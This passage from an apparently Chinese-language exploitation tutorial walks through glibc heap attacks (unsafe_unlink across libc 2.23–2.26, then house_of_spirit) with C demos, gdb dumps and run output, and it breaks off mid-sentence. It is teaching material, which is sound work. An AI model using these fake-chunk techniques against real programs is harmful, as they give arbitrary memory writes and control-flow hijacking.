off a bin list */\n#define unlink(AV, P, BK, FD) {                                            \\\n    FD = P-&gt;fd;                                      \\\n    BK = P-&gt;bk;                                      \\\n    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))              \\\n      malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \\\n    else {                                      \\\n        FD-&gt;bk = BK;                                  \\\n        BK-&gt;fd = FD;                                  \\\n        if (!in_smallbin_range (P-&gt;size)                      \\\n            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {              \\\n        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)          \\\n        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \\\n          malloc_printerr (check_action,                      \\\n                   \"corrupted double-linked list (not small)\",    \\\n                   P, AV);                          \\\n            if (FD-&gt;fd_nextsize == NULL) {                      \\\n                if (P-&gt;fd_nextsize == P)                      \\\n                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              \\\n                else {                                  \\\n                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  \\\n                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  \\\n                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  \\\n                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  \\\n                  }                                  \\\n              } else {                                  \\\n                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              \\\n                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              \\\n              }                                      \\\n          }                                      \\\n      }                                          \\\n}\n</code></pre> <p>\u5728\u89e3\u94fe\u64cd\u4f5c\u4e4b\u524d\uff0c\u9488\u5bf9\u5806\u5757 P \u81ea\u8eab\u7684 fd \u548c bk \u68c0\u67e5\u4e86\u94fe\u8868\u7684\u5b8c\u6574\u6027\uff0c\u5373\u5224\u65ad\u5806\u5757 P \u7684\u524d\u4e00\u5757 fd \u7684\u6307\u9488\u662f\u5426\u6307\u5411 P\uff0c\u4ee5\u53ca\u540e\u4e00\u5757 bk \u7684\u6307\u9488\u662f\u5426\u6307\u5411 P\u3002</p> <p>malloc_size \u8bbe\u7f6e\u4e3a 0x80\uff0c\u53ef\u4ee5\u5206\u914d small chunk\uff0c\u7136\u540e\u5b9a\u4e49 header_size \u4e3a 2\u3002\u7533\u8bf7\u4e24\u5757\u7a7a\u95f4\uff0c\u5168\u5c40\u6307\u9488 <code>chunk0_ptr</code> \u6307\u5411 chunk0\uff0c\u5c40\u90e8\u6307\u9488 <code>chunk1_ptr</code> \u6307\u5411 chunk1\uff1a</p> <pre><code>gef\u27a4  p &amp;chunk0_ptr\n$1 = (uint64_t **) 0x601070 &lt;chunk0_ptr&gt;\ngef\u27a4  x/gx &amp;chunk0_ptr\n0x601070 &lt;chunk0_ptr&gt;:  0x0000000000602010\ngef\u27a4  p &amp;chunk1_ptr\n$2 = (uint64_t **) 0x7fffffffdc60\ngef\u27a4  x/gx &amp;chunk1_ptr\n0x7fffffffdc60: 0x00000000006020a0\ngef\u27a4  x/40gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000091  &lt;-- chunk 0\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000000000\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000000091  &lt;-- chunk 1\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000000\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000000000\n0x6020e0:   0x0000000000000000  0x0000000000000000\n0x6020f0:   0x0000000000000000  0x0000000000000000\n0x602100:   0x0000000000000000  0x0000000000000000\n0x602110:   0x0000000000000000  0x0000000000000000\n0x602120:   0x0000000000000000  0x0000000000020ee1  &lt;-- top chunk\n0x602130:   0x0000000000000000  0x0000000000000000\n</code></pre> <p>\u63a5\u4e0b\u6765\u8981\u7ed5\u8fc7 <code>(P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False</code> \u7684\u68c0\u67e5\uff0c\u8fd9\u4e2a\u68c0\u67e5\u6709\u4e2a\u7f3a\u9677\uff0c\u5c31\u662f fd/bk \u6307\u9488\u90fd\u662f\u901a\u8fc7\u4e0e chunk \u5934\u90e8\u7684\u76f8\u5bf9\u5730\u5740\u6765\u67e5\u627e\u7684\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u5168\u5c40\u6307\u9488 <code>chunk0_ptr</code> \u6784\u9020 fake chunk \u6765\u7ed5\u8fc7\u5b83\uff1a</p> <pre><code>gef\u27a4  x/40gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000091  &lt;-- chunk 0\n0x602010:   0x0000000000000000  0x0000000000000000  &lt;-- fake chunk P\n0x602020:   0x0000000000601058  0x0000000000601060      &lt;-- fd, bk pointer\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000080  0x0000000000000090  &lt;-- chunk 1 &lt;-- prev_size\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000000\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000000000\n0x6020e0:   0x0000000000000000  0x0000000000000000\n0x6020f0:   0x0000000000000000  0x0000000000000000\n0x602100:   0x0000000000000000  0x0000000000000000\n0x602110:   0x0000000000000000  0x0000000000000000\n0x602120:   0x0000000000000000  0x0000000000020ee1  &lt;-- top chunk\n0x602130:   0x0000000000000000  0x0000000000000000\ngef\u27a4  x/5gx 0x601058\n0x601058:   0x0000000000000000  0x00007ffff7dd2540  &lt;-- fake chunk FD\n0x601068:   0x0000000000000000  0x0000000000602010      &lt;-- bk pointer\n0x601078:   0x0000000000000000\ngef\u27a4  x/5gx 0x601060\n0x601060:   0x00007ffff7dd2540  0x0000000000000000  &lt;-- fake chunk BK\n0x601070:   0x0000000000602010  0x0000000000000000      &lt;-- fd pointer\n0x601080:   0x0000000000000000\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6211\u4eec\u5728 chunk0 \u91cc\u6784\u9020\u4e00\u4e2a fake chunk\uff0c\u7528 P \u8868\u793a\uff0c\u4e24\u4e2a\u6307\u9488 fd \u548c bk \u53ef\u4ee5\u6784\u6210\u4e24\u6761\u94fe\uff1a<code>P-&gt;fd-&gt;bk == P</code>\uff0c<code>P-&gt;bk-&gt;fd == P</code>\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u68c0\u67e5\u3002\u53e6\u5916\u5229\u7528 chunk0 \u7684\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u901a\u8fc7\u4fee\u6539 chunk 1 \u7684 <code>prev_size</code> \u4e3a fake chunk \u7684\u5927\u5c0f\uff0c\u4fee\u6539 <code>PREV_INUSE</code> \u6807\u5fd7\u4f4d\u4e3a 0\uff0c\u5c06 fake chunk \u4f2a\u9020\u6210\u4e00\u4e2a free chunk\u3002</p> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u91ca\u653e\u6389 chunk1\uff0c\u8fd9\u4f1a\u89e6\u53d1 fake chunk \u7684 unlink \u5e76\u8986\u76d6 <code>chunk0_ptr</code> \u7684\u503c\u3002unlink \u64cd\u4f5c\u662f\u8fd9\u6837\u8fdb\u884c\u7684\uff1a</p> <pre><code>FD = P-&gt;fd;\nBK = P-&gt;bk;\nFD-&gt;bk = BK\nBK-&gt;fd = FD\n</code></pre> <p>\u6839\u636e fd \u548c bk \u6307\u9488\u5728 malloc_chunk \u7ed3\u6784\u4f53\u4e2d\u7684\u4f4d\u7f6e\uff0c\u8fd9\u6bb5\u4ee3\u7801\u7b49\u4ef7\u4e8e\uff1a</p> <pre><code>FD = P-&gt;fd = &amp;P - 24\nBK = P-&gt;bk = &amp;P - 16\nFD-&gt;bk = *(&amp;P - 24 + 24) = P\nFD-&gt;fd = *(&amp;P - 16 + 16) = P\n</code></pre> <p>\u8fd9\u6837\u5c31\u901a\u8fc7\u4e86 unlink \u7684\u68c0\u67e5\uff0c\u6700\u7ec8\u6548\u679c\u4e3a\uff1a</p> <pre><code>FD-&gt;bk = P = BK = &amp;P - 16\nBK-&gt;fd = P = FD = &amp;P - 24\n</code></pre> <p>\u539f\u672c\u6307\u5411\u5806\u4e0a fake chunk \u7684\u6307\u9488 P \u6307\u5411\u4e86\u81ea\u8eab\u5730\u5740\u51cf 24 \u7684\u4f4d\u7f6e\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u5982\u679c\u7a0b\u5e8f\u529f\u80fd\u5141\u8bb8\u5806 P \u8fdb\u884c\u5199\u5165\uff0c\u5c31\u80fd\u6539\u5199 P \u6307\u9488\u81ea\u8eab\u7684\u5730\u5740\uff0c\u4ece\u800c\u9020\u6210\u4efb\u610f\u5185\u5b58\u5199\u5165\u3002\u82e5\u5141\u8bb8\u5806 P \u8fdb\u884c\u8bfb\u53d6\uff0c\u5219\u4f1a\u9020\u6210\u4fe1\u606f\u6cc4\u6f0f\u3002</p> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u7531\u4e8e P-&gt;fd-&gt;bk \u548c P-&gt;bk-&gt;fd \u90fd\u6307\u5411 P\uff0c\u6240\u4ee5\u6700\u540e\u7684\u7ed3\u679c\u4e3a\uff1a</p> <pre><code>chunk0_ptr = P = P-&gt;fd\n</code></pre> <p>\u6210\u529f\u5730\u4fee\u6539\u4e86 chunk0_ptr\uff0c\u8fd9\u65f6 <code>chunk0_ptr</code> \u548c <code>chunk0_ptr[3]</code> \u5b9e\u9645\u4e0a\u5c31\u662f\u540c\u4e00\u4e1c\u897f\u3002\u8fd9\u91cc\u53ef\u80fd\u4f1a\u6709\u7591\u60d1\u4e3a\u4ec0\u4e48\u8fd9\u4e24\u4e2a\u4e1c\u897f\u662f\u4e00\u6837\u7684\uff0c\u56e0\u4e3a <code>chunk0_ptr</code> \u6307\u9488\u5728\u662f\u653e\u5728\u6570\u636e\u6bb5\u4e0a\u7684\uff0c\u5730\u5740\u5728 <code>0x601070</code>\uff0c\u6307\u5411 <code>0x601058</code>\uff0c\u800c <code>chunk0_ptr[3]</code> \u7684\u610f\u601d\u662f\u4ece <code>chunk0_ptr</code> \u6307\u5411\u7684\u5730\u65b9\u5f00\u59cb\u6570 3 \u4e2a\u5355\u4f4d\uff0c\u6240\u4ee5 <code>0x601058+0x08*3=0x601070</code>\uff1a</p> <pre><code>gef\u27a4  x/40gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000091  &lt;-- chunk 0\n0x602010:   0x0000000000000000  0x0000000000020ff1  &lt;-- fake chunk P\n0x602020:   0x0000000000601058  0x0000000000601060      &lt;-- fd, bk pointer\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000080  0x0000000000000090  &lt;-- chunk 1 [be freed]\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000000\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000000000\n0x6020e0:   0x0000000000000000  0x0000000000000000\n0x6020f0:   0x0000000000000000  0x0000000000000000\n0x602100:   0x0000000000000000  0x0000000000000000\n0x602110:   0x0000000000000000  0x0000000000000000\n0x602120:   0x0000000000000000  0x0000000000020ee1  &lt;-- top chunk\n0x602130:   0x0000000000000000  0x0000000000000000\ngef\u27a4  x/5gx 0x601058\n0x601058:   0x0000000000000000  0x00007ffff7dd2540  &lt;-- fake chunk FD\n0x601068:   0x0000000000000000  0x0000000000601058      &lt;-- bk pointer\n0x601078:   0x0000000000000000\ngef\u27a4  x/5gx 0x601060\n0x601060:   0x00007ffff7dd2540  0x0000000000000000  &lt;-- fake chunk BK\n0x601070:   0x0000000000601058  0x0000000000000000      &lt;-- fd pointer\n0x601080:   0x0000000000000000\ngef\u27a4  x/gx chunk0_ptr\n0x601058:   0x0000000000000000\ngef\u27a4  x/gx chunk0_ptr[3]\n0x601058:   0x0000000000000000\n</code></pre> <p>\u6240\u4ee5\uff0c\u4fee\u6539 <code>chunk0_ptr[3]</code> \u5c31\u7b49\u4e8e\u4fee\u6539 <code>chunk0_ptr</code>\uff1a</p> <pre><code>gef\u27a4  x/5gx 0x601058\n0x601058:   0x0000000000000000  0x00007ffff7dd2540\n0x601068:   0x0000000000000000  0x00007fffffffdc70  &lt;-- chunk0_ptr[3]\n0x601078:   0x0000000000000000\ngef\u27a4  x/gx chunk0_ptr\n0x7fffffffdc70: 0x4141414141414141\n</code></pre> <p>\u8fd9\u65f6 <code>chunk0_ptr</code> \u5c31\u6307\u5411\u4e86 victim_string\uff0c\u4fee\u6539\u5b83\uff1a</p> <pre><code>gef\u27a4  x/gx chunk0_ptr\n0x7fffffffdc70: 0x4242424242424242\n</code></pre> <p>\u6210\u529f\u8fbe\u6210\u4fee\u6539\u4efb\u610f\u5730\u5740\u7684\u6210\u5c31\u3002</p> <p>\u6700\u540e\u770b\u4e00\u70b9\u65b0\u7684\u4e1c\u897f\uff0clibc-2.25 \u5728 unlink \u7684\u5f00\u5934\u589e\u52a0\u4e86\u5bf9 <code>chunk_size == next-&gt;prev-&gt;chunk_size</code> \u7684\u68c0\u67e5\uff0c\u4ee5\u5bf9\u6297\u5355\u5b57\u8282\u6ea2\u51fa\u7684\u95ee\u9898\u3002\u8865\u4e01\u5982\u4e0b\uff1a</p> <pre><code>$ git show 17f487b7afa7cd6c316040f3e6c86dc96b2eec30 malloc/malloc.c\ncommit 17f487b7afa7cd6c316040f3e6c86dc96b2eec30\nAuthor: DJ Delorie &lt;dj@delorie.com&gt;\nDate:   Fri Mar 17 15:31:38 2017 -0400\n\n    Further harden glibc malloc metadata against 1-byte overflows.\n\n    Additional check for chunk_size == next-&gt;prev-&gt;chunk_size in unlink()\n\n    2017-03-17  Chris Evans  &lt;scarybeasts@gmail.com&gt;\n\n            * malloc/malloc.c (unlink): Add consistency check between size and\n            next-&gt;prev-&gt;size, to further harden against 1-byte overflows.\n\ndiff --git a/malloc/malloc.c b/malloc/malloc.c\nindex e29105c372..994a23248e 100644\n--- a/malloc/malloc.c\n+++ b/malloc/malloc.c\n@@ -1376,6 +1376,8 @@ typedef struct malloc_chunk *mbinptr;\n\n /* Take a chunk off a bin list */\n #define unlink(AV, P, BK, FD) {                                            \\\n+    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \\\n+      malloc_printerr (check_action, \"corrupted size vs. prev_size\", P, AV);  \\\n     FD = P-&gt;fd;                                                                      \\\n     BK = P-&gt;bk;                                                                      \\\n     if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                    \\\n</code></pre> <p>\u5177\u4f53\u662f\u8fd9\u6837\u7684\uff1a</p> <pre><code>/* Ptr to next physical malloc_chunk. */\n#define next_chunk(p) ((mchunkptr) (((char *) (p)) + chunksize (p)))\n/* Get size, ignoring use bits */\n#define chunksize(p) (chunksize_nomask (p) &amp; ~(SIZE_BITS))\n/* Like chunksize, but do not mask SIZE_BITS.  */\n#define chunksize_nomask(p)         ((p)-&gt;mchunk_size)\n/* Size of the chunk below P.  Only valid if prev_inuse (P).  */\n#define prev_size(p) ((p)-&gt;mchunk_prev_size)\n/* Bits to mask off when extracting size  */\n#define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)\n</code></pre> <p>\u56de\u987e\u4e00\u4e0b\u4f2a\u9020\u51fa\u6765\u7684\u5806\uff1a</p> <pre><code>gef\u27a4  x/40gx 0x602010-0x10\n0x602000:   0x0000000000000000  0x0000000000000091  &lt;-- chunk 0\n0x602010:   0x0000000000000000  0x0000000000000000  &lt;-- fake chunk P\n0x602020:   0x0000000000601058  0x0000000000601060      &lt;-- fd, bk pointer\n0x602030:   0x0000000000000000  0x0000000000000000\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000080  0x0000000000000090  &lt;-- chunk 1 &lt;-- prev_size\n0x6020a0:   0x0000000000000000  0x0000000000000000\n0x6020b0:   0x0000000000000000  0x0000000000000000\n0x6020c0:   0x0000000000000000  0x0000000000000000\n0x6020d0:   0x0000000000000000  0x0000000000000000\n0x6020e0:   0x0000000000000000  0x0000000000000000\n0x6020f0:   0x0000000000000000  0x0000000000000000\n0x602100:   0x0000000000000000  0x0000000000000000\n0x602110:   0x0000000000000000  0x0000000000000000\n0x602120:   0x0000000000000000  0x0000000000020ee1  &lt;-- top chunk\n0x602130:   0x0000000000000000  0x0000000000000000\n</code></pre> <p>\u8fd9\u91cc\u6709\u4e09\u79cd\u529e\u6cd5\u53ef\u4ee5\u7ed5\u8fc7\u8be5\u68c0\u67e5\uff1a</p> <ul> <li> <p>\u4ec0\u4e48\u90fd\u4e0d\u505a\u3002</p> </li> <li> <p><code>chunksize(P) == chunk0_ptr[1] &amp; (~ 0x7) == 0x0</code></p> </li> <li> <p><code>prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x0) == 0x0</code></p> </li> <li> <p>\u8bbe\u7f6e</p> </li> </ul> <p><code>chunk0_ptr[1] = 0x8</code></p> <p>\u3002</p> <ul> <li><code>chunksize(P) == chunk0_ptr[1] &amp; (~ 0x7) == 0x8</code></li> <li> <p><code>prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x8) == 0x8</code></p> </li> <li> <p>\u8bbe\u7f6e</p> </li> </ul> <p><code>chunk0_ptr[1] = 0x80</code></p> <p>\u3002</p> <ul> <li><code>chunksize(P) == chunk0_ptr[1] &amp; (~ 0x7) == 0x80</code></li> <li><code>prev_size (next_chunk(P)) == prev_size (chunk0_ptr + 0x80) == 0x80</code></li> </ul> <p>\u597d\u7684\uff0c\u73b0\u5728 libc-2.25 \u7248\u672c\u4e0b\u6211\u4eec\u4e5f\u80fd\u6210\u529f\u5229\u7528\u4e86\u3002\u63a5\u4e0b\u6765\u66f4\u8fd1\u4e00\u6b65\uff0clibc-2.26 \u600e\u4e48\u5229\u7528\uff0c\u9996\u5148\u5f53\u7136\u8981\u5148\u77e5\u9053\u5b83\u65b0\u589e\u4e86\u54ea\u4e9b\u6f0f\u6d1e\u7f13\u89e3\u63aa\u65bd\uff0c\u5176\u4e2d\u4e00\u4e2a\u795e\u5947\u7684\u4e1c\u897f\u53eb\u505a tcache\uff0c\u8fd9\u662f\u4e00\u79cd\u7ebf\u7a0b\u7f13\u5b58\u673a\u5236\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6709 64 \u4e2a\u5927\u5c0f\u9012\u589e\u7684 bins\uff0c\u6bcf\u4e2a bin \u662f\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u9ed8\u8ba4\u6700\u591a\u5305\u542b 7 \u4e2a chunk\u3002\u5176\u4e2d\u7f13\u5b58\u7684 chunk \u662f\u4e0d\u4f1a\u88ab\u5408\u5e76\u7684\uff0c\u6240\u4ee5\u5728\u91ca\u653e chunk 1 \u7684\u65f6\u5019\uff0c<code>chunk0_ptr</code> \u4ecd\u7136\u6307\u5411\u6b63\u786e\u7684\u5806\u5730\u5740\uff0c\u800c\u4e0d\u662f\u4e4b\u524d\u7684 <code>chunk0_ptr = P = P-&gt;fd</code>\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u4e00\u79cd\u53ef\u80fd\u7684\u529e\u6cd5\u662f\u7ed9\u586b\u5145\u8fdb\u7279\u5b9a\u5927\u5c0f\u7684 chunk \u628a bin \u5360\u6ee1\uff0c\u5c31\u50cf\u4e0b\u9762\u8fd9\u6837\uff1a</p> <pre><code>    // deal with tcache\n    int *a[10];\n    int i;\n    for (i = 0; i &lt; 7; i++) {\n        a[i] = malloc(0x80);\n    }\n    for (i = 0; i &lt; 7; i++) {\n        free(a[i]);\n    }\ngef\u27a4  p &amp;chunk0_ptr\n$2 = (uint64_t **) 0x555555755070 &lt;chunk0_ptr&gt;\ngef\u27a4  x/gx 0x555555755070\n0x555555755070 &lt;chunk0_ptr&gt;:    0x00007fffffffdd0f\ngef\u27a4  x/gx 0x00007fffffffdd0f\n0x7fffffffdd0f: 0x4242424242424242\n</code></pre> <p>\u73b0\u5728 libc-2.26 \u7248\u672c\u4e0b\u4e5f\u6210\u529f\u5229\u7528\u4e86\u3002tcache \u662f\u4e2a\u5f88\u6709\u8da3\u7684\u4e1c\u897f\uff0c\u66f4\u8be6\u7ec6\u7684\u5185\u5bb9\u6211\u4eec\u4f1a\u5728\u4e13\u95e8\u7684\u7ae0\u8282\u91cc\u53bb\u8bb2\u3002</p> <p>\u52a0\u4e0a\u5185\u5b58\u68c0\u6d4b\u53c2\u6570\u91cd\u65b0\u7f16\u8bd1\uff0c\u53ef\u4ee5\u770b\u5230 heap-buffer-overflow\uff1a</p> <pre><code>$ gcc -fsanitize=address -g unsafe_unlink.c\n$ ./a.out\nThe global chunk0_ptr is at 0x602230, pointing to 0x60c00000bf80\nThe victim chunk we are going to corrupt is at 0x60c00000bec0\n\nFake chunk fd: 0x602218\nFake chunk bk: 0x602220\n\n=================================================================\n==5591==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60c00000beb0 at pc 0x000000400d74 bp 0x7ffd06423730 sp 0x7ffd06423720\nWRITE of size 8 at 0x60c00000beb0 thread T0\n    #0 0x400d73 in main /home/firmy/how2heap/unsafe_unlink.c:26\n    #1 0x7fc925d8282f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)\n    #2 0x400968 in _start (/home/firmy/how2heap/a.out+0x400968)\n\n0x60c00000beb0 is located 16 bytes to the left of 128-byte region [0x60c00000bec0,0x60c00000bf40)\nallocated by thread T0 here:\n    #0 0x7fc9261c4602 in malloc (/usr/lib/x86_64-linux-gnu/libasan.so.2+0x98602)\n    #1 0x400b12 in main /home/firmy/how2heap/unsafe_unlink.c:13\n    #2 0x7fc925d8282f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)\n</code></pre>"},{"location":"Training/Material/Binary%20Exploitation/#house_of_spirit","title":"house_of_spirit","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    malloc(1);\n\n    fprintf(stderr, \"We will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.\\n\");\n    unsigned long long *a, *b;\n    unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));\n\n    fprintf(stderr, \"The first one:  %p\\n\", &amp;fake_chunks[0]);\n    fprintf(stderr, \"The second one: %p\\n\", &amp;fake_chunks[4]);\n\n    fake_chunks[1] = 0x20;      // the size\n    fake_chunks[5] = 0x1234;    // nextsize\n\n    fake_chunks[2] = 0x4141414141414141LL;\n    fake_chunks[6] = 0x4141414141414141LL;\n\n    fprintf(stderr, \"Overwritting our pointer with the address of the fake region inside the fake first chunk, %p.\\n\", &amp;fake_chunks[0]);\n    a = &amp;fake_chunks[2];\n\n    fprintf(stderr, \"Freeing the overwritten pointer.\\n\");\n    free(a);\n\n    fprintf(stderr, \"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n\", &amp;fake_chunks[0], &amp;fake_chunks[2]);\n    b = malloc(0x10);\n    fprintf(stderr, \"malloc(0x10): %p\\n\", b);\n    b[0] = 0x4242424242424242LL;\n}\n$ gcc -g house_of_spirit.c\n$ ./a.out\nWe will overwrite a pointer to point to a fake 'fastbin' region. This region contains two chunks.\nThe first one:  0x7ffc782dae00\nThe second one: 0x7ffc782dae20\nOverwritting our pointer with the address of the fake region inside the fake first chunk, 0x7ffc782dae00.\nFreeing the overwritten pointer.\nNow the next malloc will return the region of our fake chunk at 0x7ffc782dae00, which will be 0x7ffc782dae10!\nmalloc(0x10): 0x7ffc782dae10\n</code></pre> <p>house-of-spirit \u662f\u4e00\u79cd fastbins \u653b\u51fb\u65b9\u6cd5\uff0c\u901a\u8fc7\u6784\u9020 fake chunk\uff0c\u7136\u540e\u5c06\u5176 free \u6389\uff0c\u5c31\u53ef\u4ee5\u5728\u4e0b\u4e00\u6b21 malloc \u65f6\u8fd4\u56de fake chunk \u7684\u5730\u5740\uff0c\u5373\u4efb\u610f\u6211\u4eec\u53ef\u63a7\u7684\u533a\u57df\u3002house-of-spirit \u662f\u4e00\u79cd\u901a\u8fc7\u5806\u7684 fast bin \u673a\u5236\u6765\u8f85\u52a9\u6808\u6ea2\u51fa\u7684\u65b9\u6cd5\uff0c\u4e00\u822c\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u5229\u7528\u90fd\u5e0c\u671b\u80fd\u591f\u8986\u76d6\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4ee5\u63a7\u5236 EIP \u6765\u52ab\u6301\u63a7\u5236\u6d41\uff0c\u4f46\u5982\u679c\u6808\u6ea2\u51fa\u7684\u957f\u5ea6\u65e0\u6cd5\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u540c\u65f6\u5374\u53ef\u4ee5\u8986\u76d6\u6808\u4e0a\u7684\u4e00\u4e2a\u5373\u5c06\u88ab free \u7684\u5806\u6307\u9488\uff0c\u6b64\u65f6\u53ef\u4ee5\u5c06\u8fd9\u4e2a\u6307\u9488\u6539\u5199\u4e3a\u6808\u4e0a\u7684\u5730\u5740\u5e76\u5728\u76f8\u5e94\u4f4d\u7f6e\u6784\u9020\u4e00\u4e2a fast bin \u5757\u7684\u5143\u6570\u636e\uff0c\u63a5\u7740\u5728 free \u64cd\u4f5c\u65f6\uff0c\u8fd9\u4e2a\u6808\u4e0a\u7684\u5806\u5757\u88ab\u653e\u5230 fast bin \u4e2d\uff0c\u4e0b\u4e00\u6b21 malloc \u5bf9\u5e94\u7684\u5927\u5c0f\u65f6\uff0c\u7531\u4e8e fast bin \u7684\u5148\u8fdb\u540e\u51fa\u673a\u5236\uff0c\u8fd9\u4e2a\u6808\u4e0a\u7684\u5806\u5757\u88ab\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u518d\u6b21\u5199\u5165\u65f6\u5c31\u53ef\u80fd\u9020\u6210\u8fd4\u56de\u5730\u5740\u7684\u6539\u5199\u3002\u6240\u4ee5\u5229\u7528\u7684\u7b2c\u4e00\u6b65\u4e0d\u662f\u53bb\u63a7\u5236\u4e00\u4e2a chunk\uff0c\u800c\u662f\u63a7\u5236\u4f20\u7ed9 free \u51fd\u6570\u7684\u6307\u9488\uff0c\u5c06\u5176\u6307\u5411\u4e00\u4e2a fake chunk\u3002\u6240\u4ee5 fake chunk \u7684\u4f2a\u9020\u662f\u5173\u952e\u3002</p> <p>\u9996\u5148 malloc(1) \u7528\u4e8e\u521d\u59cb\u5316\u5185\u5b58\u73af\u5883\uff0c\u7136\u540e\u5728 fake chunk \u533a\u57df\u4f2a\u9020\u51fa\u4e24\u4e2a chunk\u3002\u53e6\u5916\u6b63\u5982\u4e0a\u9762\u6240\u8bf4\u7684\uff0c\u9700\u8981\u4e00\u4e2a\u4f20\u9012\u7ed9 free \u51fd\u6570\u7684\u53ef\u4ee5\u88ab\u4fee\u6539\u7684\u6307\u9488\uff0c\u65e0\u8bba\u662f\u901a\u8fc7\u6808\u6ea2\u51fa\u8fd8\u662f\u5176\u5b83\u4ec0\u4e48\u65b9\u5f0f\uff1a</p> <pre><code>gef\u27a4  x/10gx &amp;fake_chunks\n0x7fffffffdcb0: 0x0000000000000000  0x0000000000000020  &lt;-- fake chunk 1\n0x7fffffffdcc0: 0x4141414141414141  0x0000000000000000\n0x7fffffffdcd0: 0x0000000000000001  0x0000000000001234  &lt;-- fake chunk 2\n0x7fffffffdce0: 0x4141414141414141  0x0000000000000000\ngef\u27a4  x/gx &amp;a\n0x7fffffffdca0: 0x0000000000000000\n</code></pre> <p>\u4f2a\u9020 chunk \u65f6\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9b\u68c0\u67e5\uff0c\u9996\u5148\u662f\u6807\u5fd7\u4f4d\uff0c<code>PREV_INUSE</code> \u4f4d\u5e76\u4e0d\u5f71\u54cd free \u7684\u8fc7\u7a0b\uff0c\u4f46 <code>IS_MMAPPED</code> \u4f4d\u548c <code>NON_MAIN_ARENA</code> \u4f4d\u90fd\u8981\u4e3a\u96f6\u3002\u5176\u6b21\uff0c\u5728 64 \u4f4d\u7cfb\u7edf\u4e2d fast chunk \u7684\u5927\u5c0f\u8981\u5728 32~128 \u5b57\u8282\u4e4b\u95f4\u3002\u6700\u540e\uff0c\u662f next chunk \u7684\u5927\u5c0f\uff0c\u5fc5\u987b\u5927\u4e8e <code>2*SIZE_SZ</code>\uff08\u5373\u5927\u4e8e16\uff09\uff0c\u5c0f\u4e8e 